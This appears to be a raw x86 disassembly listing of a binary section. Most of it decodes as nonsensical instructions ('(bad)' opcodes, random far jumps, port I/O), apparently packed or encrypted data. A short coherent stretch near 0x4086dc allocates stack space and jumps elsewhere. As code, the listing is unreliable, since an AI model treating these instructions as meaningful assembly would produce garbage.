  408176:	imul   BYTE PTR [ebp-0x52]
  408179:	cmp    ah,BYTE PTR [eax+0x14]
  40817c:	add    eax,0xe6d64785
  408181:	xor    esp,DWORD PTR [ecx+0x69817703]
  408187:	dec    ebx
  408188:	cs add dh,bh
  40818b:	(bad)  
  40818c:	fistp  QWORD PTR [ebx+0x52ac8616]
  408192:	mov    eax,ds:0xddcc28ec
  408197:	ins    BYTE PTR es:[edi],dx
  408198:	and    dh,BYTE PTR ds:0x9865b122
  40819e:	loope  0x40815c
  4081a0:	xor    al,0xae
  4081a2:	jmp    DWORD PTR [ecx+edi*4+0x4f]
  4081a6:	xor    eax,0xd04e582e
  4081ab:	arpl   WORD PTR [ebx+edi*2],ax
  4081ae:	fcom   QWORD PTR [ebx+0x3b950dd1]
  4081b4:	int    0xe3
  4081b6:	(bad)  
  4081b7:	adc    BYTE PTR [ecx+0x7e34f1e3],al
  4081bd:	xor    ebp,esi
  4081bf:	adc    esp,DWORD PTR [edx-0x31]
  4081c2:	out    dx,eax
  4081c3:	xlat   BYTE PTR ds:[ebx]
  4081c4:	fadd   st(7),st
  4081c6:	ins    BYTE PTR es:[edi],dx
  4081c7:	lea    ebp,cs:[ebp-0x4d]
  4081cb:	mov    esi,0xbfe832a4
  4081d0:	ds mov bl,0x18
  4081d3:	cmp    bl,bl
  4081d5:	xchg   BYTE PTR [edi-0x44fa781a],dl
  4081db:	retf   0x2d5a
  4081de:	mov    DWORD PTR [eax-0x75],esp
  4081e1:	setno  BYTE PTR [edi]
  4081e4:	sbb    DWORD PTR [ebp-0x1b],edx
  4081e7:	rcr    BYTE PTR [ebp-0x3673e177],1
  4081ed:	and    DWORD PTR fs:[edi],ecx
  4081f0:	mov    ecx,0xb807bc8c
  4081f5:	sbb    dl,ah
  4081f7:	test   al,0xbd
  4081f9:	ja     0x4081ae
  4081fb:	sbb    eax,0x20d89ce7
  408200:	pop    ebx
  408201:	jl     0x408186
  408203:	push   0x99f41400
  408208:	xor    DWORD PTR [eax+0x16],eax
  40820b:	add    eax,0x702e3808
  408210:	xor    eax,0x49e7c74a
  408215:	mov    cl,0xfc
  408217:	mov    ds:0x393fe522,eax
  40821c:	mov    cl,0x90
  40821e:	mov    DWORD PTR [esi-0x4cf825e3],ebp
  408224:	push   eax
  408225:	mov    es,WORD PTR [esi-0x2d]
  408228:	retf   0x26de
  40822b:	daa    
  40822c:	test   eax,0x1ee80126
  408231:	dec    eax
  408232:	sub    ebp,DWORD PTR [ebx]
  408234:	sbb    al,0xf7
  408236:	adc    al,cl
  408238:	aad    0x1f
  40823a:	jb     0x4081be
  40823c:	in     al,0x82
  40823e:	push   ebp
  40823f:	add    BYTE PTR [ecx+eiz*4],dh
  408242:	retf   
  408243:	(bad)  
  408244:	enter  0x1f77,0xc4
  408248:	mov    DWORD PTR [ebx],ebx
  40824a:	push   0x7ad243be
  40824f:	dec    esi
  408250:	loop   0x4082bc
  408252:	(bad)  
  408253:	ficom  DWORD PTR [ebx]
  408255:	dec    edx
  408256:	or     dh,BYTE PTR [edx-0x5ba6b23e]
  40825c:	dec    edi
  40825d:	cmp    al,0x20
  40825f:	pop    esi
  408260:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408261:	cmp    DWORD PTR [eax-0x76],esi
  408264:	dec    edi
  408265:	inc    esi
  408266:	push   0xe
  408268:	test   DWORD PTR [ebx],0xb1160cb9
  40826e:	out    0xc7,al
  408270:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408271:	cmp    al,0x4a
  408273:	sbb    esp,ebx
  408275:	pop    esi
  408276:	icebp  
  408277:	clc    
  408278:	cmp    al,0xd7
  40827a:	cmp    eax,0xdd9d02cf
  40827f:	lahf   
  408280:	mov    esp,0xd6c0b94b
  408285:	dec    ebx
  408286:	pop    ecx
  408287:	out    dx,al
  408288:	add    dh,BYTE PTR [ebp-0x56]
  40828b:	inc    edx
  40828c:	jge    0x408309
  40828e:	xor    al,BYTE PTR [eax-0x79]
  408291:	test   edi,ebp
  408293:	ret    0x7eb9
  408296:	pop    ebx
  408297:	sub    eax,0x4ad12200
  40829c:	(bad)  [eax-0x325122ad]
  4082a2:	mov    ebp,0x35a62ff2
  4082a7:	or     al,0x7b
  4082a9:	mov    DWORD PTR [ebp+0x68],edi
  4082ac:	test   eax,0x52eee550
  4082b1:	sbb    ah,BYTE PTR [edx]
  4082b3:	adc    DWORD PTR [edi],edx
  4082b5:	popa   
  4082b6:	xor    ecx,DWORD PTR [edx]
  4082b8:	pop    esi
  4082b9:	fs jno 0x408339
  4082bc:	sahf   
  4082bd:	mov    edx,esp
  4082bf:	popf   
  4082c0:	sub    bl,ah
  4082c2:	outs   dx,BYTE PTR ds:[esi]
  4082c3:	jecxz  0x4082fd
  4082c5:	popa   
  4082c6:	loopne 0x40833a
  4082c8:	mov    cl,0xe3
  4082ca:	cmp    al,0x5f
  4082cc:	retf   
  4082cd:	inc    ebx
  4082ce:	fild   DWORD PTR [ebx]
  4082d0:	pop    edx
  4082d1:	repz push esi
  4082d3:	ins    DWORD PTR es:[edi],dx
  4082d4:	fsubr  DWORD PTR ds:0x54aa5f40
  4082da:	or     al,0x7
  4082dc:	scas   eax,DWORD PTR es:[edi]
  4082dd:	int3   
  4082de:	nop
  4082df:	add    DWORD PTR [edi+0x3c7a2d48],ebx
  4082e5:	or     BYTE PTR gs:[ebx+0x5304aeaa],ch
  4082ec:	lea    edx,[esi+0x3b]
  4082ef:	js     0x40835e
  4082f1:	mov    esi,0x72e22fc8
  4082f6:	push   ss
  4082f7:	jle    0x4082c0
  4082f9:	xor    cl,BYTE PTR ds:[eax+eax*1+0x1c688364]
  408301:	in     al,0x43
  408303:	ds stos BYTE PTR es:[edi],al
  408305:	mov    ah,0xc6
  408307:	fnstenv [ebx+0x34]
  40830a:	sub    ch,BYTE PTR [eax-0x46128b87]
  408310:	mov    dh,0x4c
  408312:	sti    
  408313:	(bad)  
  408314:	lods   eax,DWORD PTR ds:[esi]
  408315:	jbe    0x4082ef
  408317:	test   eax,0x44aa3eb6
  40831c:	mov    ds:0x9cb8dc4d,al
  408321:	add    cl,BYTE PTR [edi-0x12]
  408324:	stos   BYTE PTR es:[edi],al
  408325:	ret    
  408326:	vpunpckhdq xmm6,xmm1,XMMWORD PTR [ecx+0xeb95000]
  40832f:	call   0x6f12072e
  408334:	in     eax,0xd0
  408336:	jmp    0xe5d4:0xe01254b6
  40833d:	mov    esi,0xa02ad931
  408342:	clc    
  408343:	stos   DWORD PTR es:[edi],eax
  408344:	jbe    0x4082c7
  408346:	and    al,0x11
  408348:	cmp    DWORD PTR [ebp+0x72],0x1b935e8c
  40834f:	cld    
  408350:	xor    dh,bl
  408352:	fist   DWORD PTR [esi-0x764ab9a7]
  408358:	add    DWORD PTR [ecx+esi*2-0x4c7db512],ecx
  40835f:	ins    BYTE PTR es:[edi],dx
  408360:	push   0xffffffc7
  408362:	pop    es
  408363:	rol    DWORD PTR [ecx+0x50d87c59],cl
  408369:	lds    esp,FWORD PTR [edx+0x5aea101f]
  40836f:	ds stc 
  408371:	mov    cl,0x30
  408373:	dec    edx
  408374:	mov    dh,0x4d
  408376:	jmp    0x56bd:0xdba937d2
  40837d:	pop    es
  40837e:	sub    edi,DWORD PTR [ebx+0x10074c5e]
  408384:	(bad)  
  408385:	mov    eax,0x43ae6ab5
  40838a:	daa    
  40838b:	push   ecx
  40838c:	lods   al,BYTE PTR ds:[esi]
  40838d:	rol    DWORD PTR [esi+ebx*2],cl
  408390:	js     0x40840c
  408392:	push   esp
  408393:	sub    eax,0x3dd9506
  408398:	jb     0x4083c5
  40839a:	dec    ebx
  40839b:	cld    
  40839c:	arpl   WORD PTR [ebx+ebp*8+0x3e770a8c],cx
  4083a3:	call   0x5bab:0x91d61632
  4083aa:	lahf   
  4083ab:	mov    ecx,0xabb11084
  4083b0:	sbb    dl,BYTE PTR [ebp-0x4776277d]
  4083b6:	mul    bl
  4083b8:	dec    eax
  4083b9:	mov    ebx,DWORD PTR [ecx+0xc]
  4083bc:	mov    bh,0xe0
  4083be:	fwait
  4083bf:	cdq    
  4083c0:	add    BYTE PTR [esi-0x70d263b8],bh
  4083c6:	(bad)  
  4083c7:	xchg   esi,eax
  4083c8:	and    DWORD PTR [edi-0x1f],edi
  4083cb:	or     DWORD PTR [ebp+0x37],0x45
  4083cf:	into   
  4083d0:	sbb    ebx,eax
  4083d2:	dec    eax
  4083d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083d4:	xlat   BYTE PTR ds:[ebx]
  4083d5:	pop    es
  4083d6:	add    eax,DWORD PTR [esi+0x4d220fbc]
  4083dc:	jle    0x40836a
  4083de:	mov    cl,ch
  4083e0:	jge    0x4083ea
  4083e2:	jge    0x408393
  4083e4:	clc    
  4083e5:	nop
  4083e6:	cdq    
  4083e7:	xor    ecx,DWORD PTR [esi]
  4083e9:	xchg   ebx,eax
  4083ea:	mov    ecx,ss
  4083ec:	mov    ah,0x38
  4083ee:	inc    ebp
  4083ef:	inc    edx
  4083f0:	call   0x62f9a38a
  4083f5:	out    dx,eax
  4083f6:	inc    eax
  4083f7:	ror    DWORD PTR [edi-0x35],1
  4083fa:	and    BYTE PTR [edi+0x24bcd0d1],ah
  408400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408401:	in     al,0x2f
  408403:	push   ds
  408404:	mov    edx,0x969f198d
  408409:	mov    al,0x79
  40840b:	jae    0x3437effa
  408411:	or     al,0x36
  408413:	mov    bl,0x68
  408415:	jge    0x40848d
  408417:	mov    ecx,0xd25d1988
  40841c:	jge    0x408495
  40841e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40841f:	jge    0x408464
  408421:	dec    edi
  408422:	scas   al,BYTE PTR es:[edi]
  408423:	adc    bl,BYTE PTR [esi]
  408425:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  408427:	call   0x7be6:0x3ff8ba21
  40842e:	fwait
  40842f:	test   BYTE PTR [edi],bl
  408431:	(bad)  
  408432:	push   ebp
  408433:	ror    DWORD PTR [ecx-0x59235214],cl
  408439:	sub    ebx,edx
  40843b:	sub    al,0x4a
  40843d:	xor    eax,DWORD PTR [ebp+0x4f8269f1]
  408443:	push   0xffffffcf
  408445:	xor    DWORD PTR [edx+0x21],ebp
  408448:	inc    edx
  408449:	and    DWORD PTR [ebx],ebx
  40844b:	leave  
  40844c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40844d:	cdq    
  40844e:	mov    edi,0x42da6eda
  408453:	scas   al,BYTE PTR es:[edi]
  408454:	push   esi
  408455:	jmp    0xfd16:0x4c4ea149
  40845c:	rol    DWORD PTR [esi],cl
  40845e:	retf   
  40845f:	pushf  
  408460:	xchg   edx,eax
  408461:	int3   
  408462:	cmp    dl,bl
  408464:	daa    
  408465:	js     0x4083ef
  408467:	pop    ss
  408468:	push   edx
  408469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40846a:	mov    dl,0xdd
  40846c:	or     BYTE PTR [ecx-0x31],0x3
  408470:	cwde   
  408471:	xlat   BYTE PTR ds:[ebx]
  408472:	dec    esp
  408473:	or     al,0x1f
  408475:	jmp    0x8cd58e08
  40847a:	cmp    ebx,DWORD PTR [edx-0x49]
  40847d:	adc    esi,DWORD PTR [ebx+0x0]
  408480:	xchg   DWORD PTR [eax+0x7f],esi
  408483:	jp     0x4084ad
  408485:	push   esp
  408486:	mov    ?,WORD PTR [ecx-0x12]
  408489:	ror    al,0x1b
  40848c:	or     al,0x12
  40848e:	pop    esp
  40848f:	das    
  408490:	adc    BYTE PTR [esi],ch
  408492:	repnz mov ds:0x66b2d5ca,eax
  408498:	inc    edx
  408499:	retf   
  40849a:	inc    eax
  40849b:	add    DWORD PTR [ebx+eax*4],eax
  40849e:	jmp    0xef5a:0xbfe04944
  4084a5:	mov    ch,0xa9
  4084a7:	mov    WORD PTR ss:[edi],?
  4084aa:	and    ah,ch
  4084ac:	jno    0x40848a
  4084ae:	dec    edx
  4084af:	sub    esp,DWORD PTR [edx+0x339421bc]
  4084b5:	dec    eax
  4084b6:	fidiv  WORD PTR [ebx-0x115292fd]
  4084bc:	mov    ebp,0xfcc8c138
  4084c1:	or     bl,BYTE PTR [edi+0x1a]
  4084c4:	jmp    0x8f73889d
  4084c9:	or     eax,0x84cea714
  4084ce:	add    edx,DWORD PTR [edi-0x53]
  4084d1:	pop    ecx
  4084d2:	xchg   esi,eax
  4084d3:	je     0x40853d
  4084d5:	cmp    DWORD PTR [esi+ebx*1-0x25e5f52a],eax
  4084dc:	addr16 add ebp,ebx
  4084df:	jp     0x4084df
  4084e1:	pusha  
  4084e2:	scas   eax,DWORD PTR es:[edi]
  4084e3:	xor    edi,esp
  4084e5:	lods   al,BYTE PTR ds:[esi]
  4084e6:	add    edi,DWORD PTR [edi]
  4084e8:	jns    0x408489
  4084ea:	les    ecx,FWORD PTR [ebx-0x256e9385]
  4084f0:	pop    edi
  4084f1:	ss pop ebx
  4084f3:	pop    ds
  4084f4:	pusha  
  4084f5:	dec    ecx
  4084f6:	pop    ebp
  4084f7:	int3   
  4084f8:	inc    edi
  4084f9:	(bad)
  4084fc:	fwait
  4084fd:	sub    esp,DWORD PTR [esi+0x29]
  408500:	inc    edi
  408501:	imul   ebx,DWORD PTR [esi+0x1b74eb69],0x44
  408508:	push   esi
  408509:	or     DWORD PTR [ebx+0x19],edi
  40850c:	in     al,0x17
  40850e:	inc    eax
  40850f:	adc    edx,DWORD PTR [ecx]
  408511:	aam    0x4e
  408513:	xchg   edx,ebp
  408515:	pop    eax
  408516:	fstp   TBYTE PTR [ebx]
  408518:	or     al,0xd8
  40851a:	(bad)  
  40851b:	int    0x41
  40851d:	dec    ecx
  40851e:	sbb    BYTE PTR [ebx+edi*2-0x7a],ch
  408522:	push   ebp
  408523:	pushf  
  408524:	mov    ch,BYTE PTR [ebp+0xe]
  408527:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408528:	add    al,0xe9
  40852a:	fwait
  40852b:	inc    ebp
  40852c:	cmp    ah,BYTE PTR [ebp-0x65]
  40852f:	sub    al,0x1a
  408531:	or     al,0x3f
  408533:	mov    ebx,0x46702952
  408538:	jmp    0x2993:0x402f325a
  40853f:	sub    ah,BYTE PTR [edi]
  408541:	es sbb al,0xf8
  408544:	test   al,0x25
  408546:	dec    ebp
  408547:	mov    dl,0xb2
  408549:	add    al,0x1
  40854b:	jno    0x408517
  40854d:	mov    ds,WORD PTR [ecx+edx*4+0xb]
  408551:	cmp    esp,DWORD PTR [ebp+0x39]
  408554:	add    DWORD PTR ds:0x73d4c95b,eax
  40855a:	dec    esi
  40855b:	addr16 add ebp,ecx
  40855e:	cmp    DWORD PTR [ebx],ecx
  408560:	shl    BYTE PTR [esp+esi*1-0x763e2ba],1
  408567:	in     eax,0xa4
  408569:	nop
  40856a:	ins    DWORD PTR es:[edi],dx
  40856b:	test   al,0x5
  40856d:	mov    edx,0x7fec4513
  408572:	inc    ebp
  408573:	sub    al,0x88
  408575:	inc    edx
  408576:	jnp    0x408564
  408578:	adc    cl,BYTE PTR [ebp+0x1f]
  40857b:	in     eax,0x3c
  40857d:	push   ds
  40857e:	ins    DWORD PTR es:[edi],dx
  40857f:	push   0xffffffdf
  408581:	mov    ebp,0xe4ffd77d
  408586:	jmp    0x38a4:0x103325be
  40858d:	push   esp
  40858e:	cmp    esi,DWORD PTR es:[eax]
  408591:	retf   0x539a
  408594:	rcl    DWORD PTR [esi+eiz*8-0x2e02a379],0xee
  40859c:	mov    eax,0x455708d
  4085a1:	xchg   esi,eax
  4085a2:	inc    BYTE PTR [esi]
  4085a4:	std    
  4085a5:	add    DWORD PTR [edi-0x5f],ecx
  4085a8:	inc    edx
  4085a9:	(bad)  
  4085ab:	(bad)  
  4085ac:	shr    BYTE PTR [esi-0x10],0x59
  4085b0:	ret    
  4085b1:	adc    ah,BYTE PTR [edx-0x2ad95674]
  4085b7:	test   al,0x5a
  4085b9:	aad    0xd9
  4085bb:	ror    DWORD PTR [esi+edx*2-0x76b0c66d],cl
  4085c2:	push   0x9668e74f
  4085c7:	lods   al,BYTE PTR ds:[esi]
  4085c8:	inc    ebx
  4085c9:	inc    esp
  4085ca:	js     0x408645
  4085cc:	jge    0x408626
  4085ce:	ret    
  4085cf:	sbb    BYTE PTR [ecx+edi*2],al
  4085d2:	aad    0x1a
  4085d4:	test   al,0x5
  4085d6:	pop    esi
  4085d7:	dec    edx
  4085d8:	mov    edi,0x47dc2631
  4085dd:	sub    esi,DWORD PTR [edx+edx*4-0x66c4b01b]
  4085e4:	rcr    edx,0xe3
  4085e7:	jb     0x40859b
  4085e9:	pop    ebx
  4085ea:	movzx  edi,WORD PTR [eax-0x7c]
  4085ee:	test   BYTE PTR [edx-0x22],bl
  4085f1:	mov    ch,0xe1
  4085f3:	cmp    BYTE PTR [ecx+0x44b8f75b],al
  4085f9:	rcr    DWORD PTR [edi+edi*4+0xe3b0e29],cl
  408600:	retf   0xbf88
  408603:	pop    ecx
  408604:	fwait
  408605:	mov    esp,0x2b2c1d8f
  40860a:	sub    eax,0xadc867e2
  40860f:	mov    esp,0x18d33306
  408614:	dec    edi
  408615:	mov    ds:0x47bba710,eax
  40861a:	xor    ch,cl
  40861c:	ror    DWORD PTR [edx+edx*8+0x7ddf6607],cl
  408623:	xchg   edx,eax
  408624:	fidivr DWORD PTR [ebx+0x33]
  408627:	mov    ss,esp
  408629:	xchg   esp,eax
  40862a:	xor    eax,0x34b9d645
  40862f:	sar    BYTE PTR [edi-0x2a],1
  408632:	lock pop ecx
  408634:	add    DWORD PTR [edx+0x97d7a0b],edx
  40863a:	inc    esi
  40863b:	mov    WORD PTR ss:[eax],cs
  40863e:	arpl   WORD PTR [esp+edx*4],di
  408641:	mov    dl,0xa
  408643:	add    al,cl
  408645:	cmp    DWORD PTR [esi+0x53bfe844],ebx
  40864b:	scas   eax,DWORD PTR es:[edi]
  40864c:	jle    0x4086a1
  40864e:	mov    ch,0xff
  408650:	int    0xe5
  408652:	xor    ch,BYTE PTR [esi]
  408654:	or     bh,ch
  408656:	retf   0x510b
  408659:	popa   
  40865a:	loope  0x408642
  40865c:	inc    esi
  40865d:	imul   DWORD PTR [ebx+eax*1]
  408660:	pushf  
  408661:	in     eax,dx
  408662:	or     DWORD PTR [edi],edi
  408664:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408665:	cmp    edi,edx
  408667:	loop   0x40861b
  408669:	mov    BYTE PTR [ebx],cl
  40866b:	or     DWORD PTR [ecx],ebp
  40866d:	and    ebp,ebp
  40866f:	adc    BYTE PTR [ecx],bh
  408671:	cli    
  408672:	pop    edi
  408673:	test   BYTE PTR [edx+0x29],ah
  408676:	daa    
  408677:	fwait
  408678:	sbb    ch,bl
  40867a:	out    0xa8,eax
  40867c:	xchg   edx,eax
  40867d:	xor    al,0x8e
  40867f:	mov    DWORD PTR ds:0xf5014532,edi
  408685:	xchg   ebx,eax
  408686:	pop    esp
  408687:	xor    eax,0x4ced30dc
  40868c:	pop    ds
  40868d:	dec    eax
  40868e:	rcr    DWORD PTR [eax-0x7f7c3afe],0x77
  408695:	inc    eax
  408696:	retf   
  408697:	dec    ecx
  408698:	out    0xf4,eax
  40869a:	iret   
  40869b:	outs   dx,BYTE PTR ds:[esi]
  40869c:	rcl    DWORD PTR [ebp-0x78db314e],0xf8
  4086a3:	out    0xd9,al
  4086a5:	daa    
  4086a6:	push   cs
  4086a7:	push   cs
  4086a8:	add    al,0xde
  4086aa:	mov    BYTE PTR [esi-0x2089a7fb],bh
  4086b0:	sbb    edx,esp
  4086b2:	adc    BYTE PTR [esp+eiz*4+0x4e],0xce
  4086b7:	xor    al,0x17
  4086b9:	scas   eax,DWORD PTR es:[edi]
  4086ba:	mov    eax,ds:0xa54bc7fa
  4086bf:	enter  0xe30d,0x61
  4086c3:	sbb    al,0x8d
  4086c5:	call   0xb8d3:0x105c3339
  4086cc:	lods   al,BYTE PTR ds:[esi]
  4086cd:	call   0x1bc1:0x9e318476
  4086d4:	fwait
  4086d5:	and    ebx,DWORD PTR [ebx+eax*1-0x2dccfc96]
  4086dc:	pop    edx
  4086dd:	add    edx,0x8
  4086e0:	push   edx
  4086e1:	pop    ecx
  4086e2:	push   0x6
  4086e4:	dec    ecx
  4086e5:	pop    ebx
  4086e6:	dec    ebx
  4086e7:	xchg   ebx,ecx
  4086e9:	sub    ebx,ecx
  4086eb:	xchg   ebx,ecx
  4086ed:	dec    ecx
  4086ee:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f1:	imul   eax,ecx
  4086f4:	sub    esp,eax
  4086f6:	mov    DWORD PTR [ebp-0x20],esp
  4086f9:	mov    eax,DWORD PTR [ebp-0x4]
  4086fc:	mov    ecx,0x7510893
  408701:	jmp    0x40aa90
  408706:	dec    edi
  408707:	mov    al,0x72
  408709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40870a:	mov    cl,0x64
  40870c:	mov    ds:0xbf3f0e63,eax
  408711:	mov    eax,0xd38b6a38
  408716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408717:	sbb    BYTE PTR [edx+0x62],ah
  40871a:	adc    BYTE PTR [edi+0x62],bl
  40871d:	(bad)  
  40871e:	fsubrp st(1),st
  408720:	(bad)  
  408721:	fist   WORD PTR [ebx]
  408723:	dec    ebp
  408724:	jne    0x4086b5
  408726:	icebp  
  408727:	inc    ebx
  408728:	out    dx,al
  408729:	out    dx,eax
  40872a:	or     esi,0x6293f762
  408730:	aas    
  408731:	xchg   esi,eax
  408732:	scas   al,BYTE PTR es:[edi]
  408733:	mov    bh,0x96
  408735:	and    al,0xa2
  408737:	sub    cl,BYTE PTR [ebx+edi*4]
  40873a:	ret    0xbaf6
  40873d:	fld    TBYTE PTR [edi]
  40873f:	in     eax,dx
  408740:	bound  ebx,QWORD PTR [ebp-0x5c]
  408743:	and    al,0x27
  408745:	jg     0x4086f5
  408747:	test   al,0x20
  408749:	sti    
  40874a:	pop    esi
  40874b:	dec    ebx
  40874c:	stos   DWORD PTR es:[edi],eax
  40874d:	xchg   edx,eax
  40874e:	adc    ebx,DWORD PTR ss:[eax-0x14]
  408752:	pushf  
  408753:	pop    eax
  408755:	hlt    
  408756:	rcr    ecx,0x5b
  408759:	dec    edi
  40875a:	mov    ebx,0xd35cf153
  40875f:	cmp    BYTE PTR [esi-0x3c],al
  408762:	and    DWORD PTR [ebp+0x220c2610],edi
  408768:	jle    0x408772
  40876a:	retf   0xe19c
  40876d:	retf   0x59d3
  408770:	retf   
  408771:	sete   BYTE PTR [esi-0x43]
  408775:	ret    
  408776:	pop    ss
  408777:	mov    al,0x83
  408779:	fbld   TBYTE PTR [edx]
  40877b:	fwait
  40877c:	stos   DWORD PTR es:[edi],eax
  40877d:	dec    edi
  40877e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40877f:	shl    ecx,0x7e
  408782:	jle    0x40877d
  408784:	(bad)  [edx-0x53]
  408787:	out    0xe2,eax
  408789:	call   0x5237438e
  40878e:	stos   BYTE PTR es:[edi],al
  40878f:	clc    
  408790:	xchg   DWORD PTR [edi],ebx
  408792:	pop    edi
  408793:	adc    ah,BYTE PTR [edi+0x6]
  408796:	lds    ecx,FWORD PTR [ebp+0x2a3a5f4d]
  40879c:	outs   dx,BYTE PTR ds:[esi]
  40879d:	add    ebx,esp
  40879f:	mov    bl,0xda
  4087a1:	fs gs mov esp,0x1c4569df
  4087a8:	jmp    0x40872d
  4087aa:	ret    0xa54c
  4087ad:	mov    edx,0x9e61da70
  4087b2:	push   cs
  4087b3:	aam    0xe0
  4087b5:	repnz (bad) 
  4087b7:	jb     0x4087d2
  4087b9:	int3   
  4087ba:	sbb    BYTE PTR [esi+0x2b],al
  4087bd:	jo     0x40877c
  4087bf:	arpl   WORD PTR [edx-0x4f],dx
  4087c2:	mov    edx,DWORD PTR [edx-0x4c]
  4087c5:	inc    ebx
  4087c6:	out    dx,al
  4087c7:	adc    al,0x9
  4087c9:	and    edx,DWORD PTR [ebx]
  4087cb:	gs cld 
  4087cd:	dec    eax
  4087ce:	lock mov eax,0x2b3e650a
  4087d4:	or     eax,0x27fb4e90
  4087d9:	lds    ebx,FWORD PTR [esi]
  4087db:	sub    ecx,ebp
  4087dd:	stos   BYTE PTR es:[edi],al
  4087de:	cmp    eax,0xb29b747c
  4087e3:	call   0xacc94018
  4087e8:	icebp  
  4087e9:	mov    eax,ds:0x73dd4a68
  4087ee:	sbb    eax,0xc0f7c2af
  4087f3:	jge    0x4087b9
  4087f5:	jmp    0x74c8:0x7c9e309a
  4087fc:	scas   al,BYTE PTR es:[edi]
  4087fd:	inc    edx
  4087fe:	sub    ch,ah
  408800:	test   eax,0xdd7a9c98
  408805:	mov    esi,0x50354c3b
  40880a:	inc    edi
  40880b:	sbb    DWORD PTR [eax+0x8],0x943048fc
  408812:	mov    cl,bl
  408814:	pop    esp
  408815:	fidiv  WORD PTR [edi+eax*4-0x69]
  408819:	int3   
  40881a:	addr16 fsubr st,st(0)
  40881d:	sbb    eax,0x90a2bda6
  408822:	addr16 pop ss
  408824:	adc    DWORD PTR ds:0xabf38a2d,ecx
  40882a:	stc    
  40882b:	push   ds
  40882c:	cmp    BYTE PTR [eax-0x5084897],0x13
  408833:	(bad)  
  408834:	imul   bl
  408836:	push   cs
  408837:	cs dec eax
  408839:	and    DWORD PTR [edx+0xb],0x18
  40883d:	xchg   ecx,eax
  40883e:	push   ss
  40883f:	jae    0x408893
  408841:	cmc    
  408842:	cmp    bh,BYTE PTR [edi+0x7f]
  408845:	(bad)  
  408846:	push   edx
  408847:	adc    al,0xdd
  408849:	inc    ebp
  40884a:	mov    edx,0x3aed9027
  40884f:	fmul   DWORD PTR [edi-0x1cb2ea54]
  408855:	js     0x4088ac
  408857:	or     ch,BYTE PTR [ebx+eiz*2]
  40885a:	fcomp  DWORD PTR [esi-0x1f2edebe]
  408860:	mov    dl,0x3d
  408862:	stos   BYTE PTR es:[edi],al
  408863:	repz jle 0x40880e
  408866:	gs test eax,0xd6abfae
  40886c:	cmc    
  40886d:	pop    edx
  40886e:	xchg   ebx,eax
  40886f:	adc    ecx,ecx
  408871:	inc    esp
  408872:	xchg   edx,eax
  408873:	loop   0x40886d
  408875:	aaa    
  408876:	push   ss
  408877:	sti    
  408878:	or     eax,0xb9d0e958
  40887d:	nop
  40887e:	xor    al,0x9f
  408880:	out    dx,eax
  408881:	cmp    dl,0x92
  408884:	stc    
  408885:	mov    cl,0x83
  408887:	lea    esi,[ecx*2-0x22a4a197]
  40888e:	xlat   BYTE PTR ds:[ebx]
  40888f:	inc    ecx
  408890:	and    dl,BYTE PTR [edi-0x7ae4a331]
  408896:	xor    al,BYTE PTR [esi]
  408898:	mov    ebp,0x285eedae
  40889d:	(bad)  
  40889e:	sbb    dl,BYTE PTR [eax+0x4ef11db5]
  4088a4:	(bad)  
  4088a5:	cmp    BYTE PTR [ecx-0x5009b7f7],al
  4088ab:	js     0x408836
  4088ad:	xchg   ecx,eax
  4088ae:	stos   DWORD PTR es:[edi],eax
  4088af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088b0:	add    cl,BYTE PTR [edi-0x65]
  4088b3:	mov    DWORD PTR [ebx+0x35],ebp
  4088b6:	into   
  4088b7:	sub    edi,DWORD PTR [eax+0x52]
  4088ba:	xchg   sp,ax
  4088bc:	ret    
  4088bd:	push   ss
  4088be:	js     0x40893c
  4088c0:	hlt    
  4088c1:	loop   0x4088e8
  4088c3:	sub    BYTE PTR [eax],0x6b
  4088c6:	retf   0xa3b4
  4088c9:	xchg   edx,eax
  4088ca:	lea    eax,[eax+0x56]
  4088cd:	xchg   BYTE PTR [ebx+ebp*2-0x2dde7197],bh
  4088d4:	cwde   
  4088d5:	ins    BYTE PTR es:[edi],dx
  4088d6:	lea    edx,[ecx+0x33]
  4088d9:	mov    dh,0x59
  4088db:	ins    DWORD PTR es:[edi],dx
  4088dc:	sbb    eax,0xdfc4d6d4
  4088e1:	pop    edx
  4088e2:	dec    ebx
  4088e3:	(bad)  
  4088e4:	xor    esp,ecx
  4088e6:	jle    0x408900
  4088e8:	ret    
  4088e9:	inc    eax
  4088ea:	and    edi,0xd5e732ec
  4088f0:	(bad)  
  4088f1:	cmc    
  4088f2:	out    0xb2,eax
  4088f4:	arpl   WORD PTR [esi+edi*2],bp
  4088f7:	pushf  
  4088f8:	mov    al,ds:0x586fcfdf
  4088fd:	outs   dx,DWORD PTR ds:[esi]
  4088fe:	jmp    FWORD PTR [edi]
  408900:	in     al,dx
  408901:	jmp    0x6621d523
  408906:	out    0xf,al
  408908:	add    bh,BYTE PTR [edi]
  40890a:	mov    dl,bl
  40890c:	or     eax,0x42c4e2a2
  408911:	fisub  WORD PTR [ebp+0x7c]
  408914:	inc    ecx
  408915:	and    eax,DWORD PTR [edx+0x52]
  408918:	mov    dh,0x3f
  40891a:	sub    ebx,DWORD PTR [edi-0x70c1a0]
  408920:	les    esi,FWORD PTR [ebx-0x4f935a4]
  408926:	popa   
  408927:	sti    
  408928:	lods   eax,DWORD PTR ds:[esi]
  408929:	or     BYTE PTR [ebx+0x4d],cl
  40892c:	call   0xeb9:0xec715a53
  408933:	retf   0xa93b
  408936:	pop    ds
  408937:	(bad)  [ecx]
  408939:	xor    BYTE PTR [ecx],0x13
  40893c:	(bad)  
  40893d:	cmc    
  40893e:	add    al,BYTE PTR [ecx]
  408940:	pop    ecx
  408941:	std    
  408942:	mov    eax,0xdc1e800
  408947:	cs nop
  408949:	out    dx,al
  40894a:	adc    esi,DWORD PTR [ebx]
  40894c:	pop    ecx
